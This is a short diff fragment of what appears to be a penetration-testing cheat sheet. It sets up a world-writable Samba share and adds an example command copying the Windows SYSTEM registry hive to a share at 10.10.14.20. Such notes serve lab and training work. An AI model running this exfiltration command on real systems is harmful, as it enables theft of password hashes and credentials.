@@ -15,3 +15,5 @@ mkdir /tmp/Public
 chmod 777 /tmp/Public
 service smbd restart
 ```
+- example
+  `cmd /c copy C:\SYSTEM \\10.10.14.20\Public\SYSTEM`
